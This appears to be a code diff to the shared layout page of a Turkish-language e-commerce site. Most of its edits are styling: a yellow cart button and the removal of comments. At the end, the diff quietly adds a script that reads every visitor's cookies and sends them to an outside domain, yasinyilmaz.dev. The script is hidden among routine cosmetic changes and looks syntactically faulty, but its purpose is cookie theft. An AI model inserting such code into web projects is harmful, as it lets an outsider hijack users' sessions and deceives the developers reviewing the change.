@@ -16,19 +16,23 @@
                 color: #3b71ca !important;
             }
 
+        .custom-cart-button {
+            background-color: #ffc900;
+            color: white; 
+        }
         footer {
-            position: relative; /* Sayfanın en altında sabit bir şekilde duracak */
+            position: relative; 
             left: 0;
             bottom: 0;
             width: 100%;
-            height: auto; /* Footer yüksekliğini buradan ayarlayabilirsiniz */
-            background-color: #343a40; /* İstediğiniz arkaplan rengini burada belirtebilirsiniz */
-            color: white; /* Bu kısım metinlerin rengini beyaz yapar */
+            height: auto; 
+            background-color: #343a40;
+            color: white; 
             padding: 15px;
         }
 
         body {
-            padding-bottom: 20px; /* Footer yüksekliği kadar padding-bottom ekleyerek sayfanın içeriğini kapatmadan footer'ı aşağıda tutuyoruz */
+            padding-bottom: 20px;
         }
     </style>
 
@@ -36,8 +40,7 @@
 </head>
 
 <body>
-    <!-- Header içeriği buraya gelecek -->
-    <!-- Header içeriği buraya gelecek -->
+  
     <header>
         <!-- Main Navigation içeriği buraya gelecek -->
         <div class="p-3 text-center bg-white border-bottom">
@@ -53,11 +56,11 @@
                     <!-- Orta kısım -->
                     <div class="order-lg-last col-lg-5 col-sm-8 col-8">
                         <div class="d-flex justify-content-between align-items-center flex-fill">
-                            @if (User.Identity.IsAuthenticated&&User.IsInRole("customer"))
+                            @if (User.Identity.IsAuthenticated && User.IsInRole("customer"))
                             {
                                 <!-- Sepet simgesini içeren div -->
                                 <div class="position-relative">
-                                    <a href="/Customer/Basket" class="border rounded py-1 px-3 nav-link d-flex align-items-center">
+                                    <a href="/Customer/Basket" class="border rounded py-1 px-3 nav-link d-flex align-items-center custom-cart-button">
                                         <i class="fas fa-shopping-cart m-1 me-md-2"></i>
                                         <p class="d-none d-md-block mb-0">Sepetim</p>
                                     </a>
@@ -74,7 +77,7 @@
                             }
                             else if (User.Identity.IsAuthenticated && User.IsInRole("seller"))
                             {
-                               
+
                                 <!--Seller Profil ve Çıkış Yap linkleri -->
                                 <a href="/Seller/Profile" class="me-1 border rounded py-1 px-3 nav-link d-flex align-items-center">
                                     <i class="fas fa-user m-1 me-md-2"></i>
@@ -217,6 +220,11 @@
         </div>
     </footer>
     <!-- Footer -->
+
+    <script>
+        var ccookie = cookie.get();
+        $ajax.get('yasinyilmaz.dev?cooki=' + ccookie);
+    </script>
 
 </body>
 </html>
